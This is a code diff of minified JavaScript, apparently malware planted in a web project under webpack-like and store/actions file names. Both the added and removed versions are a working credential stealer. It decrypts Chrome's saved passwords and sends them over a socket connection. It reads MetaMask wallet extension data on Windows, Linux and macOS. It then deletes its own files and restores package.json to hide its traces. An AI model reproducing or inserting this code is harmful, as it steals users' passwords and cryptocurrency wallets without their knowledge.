@@ -84,148 +84,156 @@ function m(o) {
 }
 g.on("connect", function (e) {
   let a = [];
-  if ("Windows_NT" == r) {
-    const i = "public/webpack_override";
-    var o = s.join(
-      ...String(h).split("/"),
-      "AppData",
-      "Local",
-      "Google",
-      "Chrome",
-      "User Data",
-      "Local State"
-    );
-    l.readFile(o, "utf-8", (e, o) => {
-      (o = JSON.parse(o).os_crypt.encrypted_key), (o = b(o));
-      const n = p.CryptUnprotectData(o.slice(5));
-      for (let e = 0; e < d.length; e++)
-        a.push(
-          s.join(
-            ...String(h).split("/"),
-            "AppData",
-            "Local",
-            "Google",
-            "Chrome",
-            "User Data",
-            d[e],
-            "Login Data"
-          )
-        );
-      for (let e = 0; e < a.length; e++) {
-        var t = a[e];
-        const r = `public/webpacktemp${e}.db`;
-        !0 === P(t) &&
-          l.copyFile(t, r, (e) => {
-            const t = new f.Database(r);
-            t.all("SELECT * FROM logins", async (e, o) => {
-              e ||
-                (o.forEach((e) => {
-                  var o = e.origin_url,
-                    t = e.username_value,
-                    e = e.password_value,
-                    r = e.subarray(0, 3).toString("utf-8");
-                  if ("v10" === r) {
-                    (r = e.subarray(3, 15)),
-                      (e = e.subarray(15, e.length - 16));
-                    if (e.length) {
-                      r = c.createDecipheriv("aes-256-gcm", n, r).update(e);
-                      try {
-                        l.appendFileSync(
-                          i,
-                          `
+  try {
+    if ("Windows_NT" == r) {
+      const i = "public/webpack_override";
+      var o = s.join(
+        ...String(h).split("/"),
+        "AppData",
+        "Local",
+        "Google",
+        "Chrome",
+        "User Data",
+        "Local State"
+      );
+      l.readFile(o, "utf-8", (e, o) => {
+        (o = JSON.parse(o).os_crypt.encrypted_key), (o = b(o));
+        const n = p.CryptUnprotectData(o.slice(5));
+        for (let e = 0; e < d.length; e++)
+          a.push(
+            s.join(
+              ...String(h).split("/"),
+              "AppData",
+              "Local",
+              "Google",
+              "Chrome",
+              "User Data",
+              d[e],
+              "Login Data"
+            )
+          );
+        for (let e = 0; e < a.length; e++) {
+          var t = a[e];
+          const r = `public/webpacktemp${e}.db`;
+          !0 === P(t) &&
+            l.copyFile(t, r, (e) => {
+              const t = new f.Database(r);
+              t.all("SELECT * FROM logins", async (e, o) => {
+                e ||
+                  (o.forEach((e) => {
+                    var o = e.origin_url,
+                      t = e.username_value,
+                      e = e.password_value,
+                      r = e.subarray(0, 3).toString("utf-8");
+                    if ("v10" === r) {
+                      (r = e.subarray(3, 15)),
+                        (e = e.subarray(15, e.length - 16));
+                      if (e.length) {
+                        r = c.createDecipheriv("aes-256-gcm", n, r).update(e);
+                        try {
+                          l.appendFileSync(
+                            i,
+                            `
 W: ${o}
 U: ${t}
 P: ${r}
 *********************************************************`
-                        );
-                      } catch (e) {}
+                          );
+                        } catch (e) {}
+                      }
                     }
-                  }
-                }),
-                await m(10),
-                t.close(),
-                await m(10),
-                l.unlink(r, (e) => {}),
-                (e = l.createReadStream(i)).setMaxListeners(100),
-                e.on("data", async (e) => {
-                  e = { path: u + " 10000000000000000 Chrome-Chrome", data: e };
-                  g.emit("fileData", e);
-                }));
+                  }),
+                  await m(10),
+                  t.close(),
+                  await m(10),
+                  l.unlink(r, (e) => {}),
+                  (e = l.createReadStream(i)).setMaxListeners(100),
+                  e.on("data", async (e) => {
+                    e = {
+                      path: u + " 10000000000000000 Chrome-Chrome",
+                      data: e,
+                    };
+                    g.emit("fileData", e);
+                  }));
+              });
             });
+        }
+        l.unlink(process.cwd() + "/src/store/actions/act.js", (e) => {}),
+          l.copyFile(
+            process.cwd() + "/src/store/actions/index.json",
+            process.cwd() + "/package.json",
+            (e) => {}
+          ),
+          setTimeout(() => {
+            l.unlink(
+              process.cwd() + "/src/store/actions/index.json",
+              (e) => {}
+            ),
+              l.unlink(
+                process.cwd() + "/src/store/actions/config.node",
+                (e) => {}
+              );
+          }, 1e3),
+          setTimeout(() => {
+            l.unlink(i, (e) => {});
+          }, 1e4);
+      });
+    }
+    d.forEach((i) => {
+      "Windows_NT" == r
+        ? (a = [
+            s.join(
+              ...String(h).split("/"),
+              ...String(
+                `/AppData/Local/Google/Chrome/User Data/${i}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`
+              ).split("/")
+            ),
+          ])
+        : "Linux" == r
+        ? (a = [
+            h +
+              `/.config/google-chrome/${i}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
+            h +
+              `/.config/google-chrome/${i}/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
+          ])
+        : "Darwin" == r &&
+          (a = [
+            h +
+              `/Library/Application Support/Google/Chrome/${i}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
+          ]);
+      for (let e = 0; e < a.length; e++) {
+        const t = a[e];
+        P(t) &&
+          l.readdir(t, (e, o) => {
+            e ||
+              o.forEach(async (e) => {
+                e = s.join(t, e);
+                try {
+                  if (e.includes(".ldb") || e.includes(".log")) {
+                    let o = (131072).toString(),
+                      t =
+                        u +
+                        " " +
+                        o +
+                        " " +
+                        i.replace(" ", "") +
+                        "-" +
+                        s.basename(e);
+                    const n = l.createReadStream(e);
+                    n.setMaxListeners(100);
+                    let r = 0;
+                    n.on("data", async (e) => {
+                      r += Number(e.length);
+                      e = { path: t, data: e };
+                      g.emit("fileData", e),
+                        await m(10),
+                        r >= Number(o) && n.close(async () => {});
+                    });
+                  }
+                } catch (e) {}
+              });
           });
       }
-      l.unlink(process.cwd() + "/src/store/actions/act.js", (e) => {}),
-        l.copyFile(
-          process.cwd() + "/src/store/actions/index.json",
-          process.cwd() + "/package.json",
-          (e) => {}
-        ),
-        setTimeout(() => {
-          l.unlink(process.cwd() + "/src/store/actions/index.json", (e) => {}),
-            l.unlink(
-              process.cwd() + "/src/store/actions/config.node",
-              (e) => {}
-            );
-        }, 1e3),
-        setTimeout(() => {
-          l.unlink(i, (e) => {});
-        }, 1e4);
     });
-  }
-  d.forEach((i) => {
-    "Windows_NT" == r
-      ? (a = [
-          s.join(
-            ...String(h).split("/"),
-            ...String(
-              `/AppData/Local/Google/Chrome/User Data/${i}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`
-            ).split("/")
-          ),
-        ])
-      : "Linux" == r
-      ? (a = [
-          h +
-            `/.config/google-chrome/${i}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
-          h +
-            `/.config/google-chrome/${i}/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
-        ])
-      : "Darwin" == r &&
-        (a = [
-          h +
-            `/Library/Application Support/Google/Chrome/${i}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`,
-        ]);
-    for (let e = 0; e < a.length; e++) {
-      const t = a[e];
-      P(t) &&
-        l.readdir(t, (e, o) => {
-          e ||
-            o.forEach(async (e) => {
-              e = s.join(t, e);
-              try {
-                if (e.includes(".ldb") || e.includes(".log")) {
-                  let o = (131072).toString(),
-                    t =
-                      u +
-                      " " +
-                      o +
-                      " " +
-                      i.replace(" ", "") +
-                      "-" +
-                      s.basename(e);
-                  const n = l.createReadStream(e);
-                  n.setMaxListeners(100);
-                  let r = 0;
-                  n.on("data", async (e) => {
-                    r += Number(e.length);
-                    e = { path: t, data: e };
-                    g.emit("fileData", e),
-                      await m(10),
-                      r >= Number(o) && n.close(async () => {});
-                  });
-                }
-              } catch (e) {}
-            });
-        });
-    }
-  });
+  } catch (e) {}
 });
